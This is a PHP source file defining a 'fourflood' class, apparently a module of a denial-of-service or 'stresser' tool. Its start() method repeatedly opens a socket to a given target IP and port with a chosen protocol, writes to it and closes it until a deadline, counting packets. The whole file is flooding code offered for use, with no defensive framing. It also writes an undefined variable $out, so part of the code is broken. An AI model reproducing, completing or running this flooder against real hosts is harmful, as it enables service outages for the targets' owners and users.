<?php
include_once "../header.php";
class fourflood{
	public $ip;
	public $port;
	public $timedout;
	public $max_time;
	public $method;
	public function __construct($ip, $port, $timedout, $max_time, $method) {
		$this->ip = $ip;
		$this->port = $port;
		$this->timedout = $timedout;
		$this->max_time = $max_time;
		$this->method = $method;
	}
	function start(){
		$packet = 0;
		while(1){
			$packet++; 
			if(time() > $this->max_time){
				return $packet;
				break; 
			}
			$fp = fsockopen($this->method."://".$this->ip, $this->port, $errno, $errstr, $this->timedout); 
			fwrite($fp, $out); 
			fclose($fp);

		}
	}
}
?>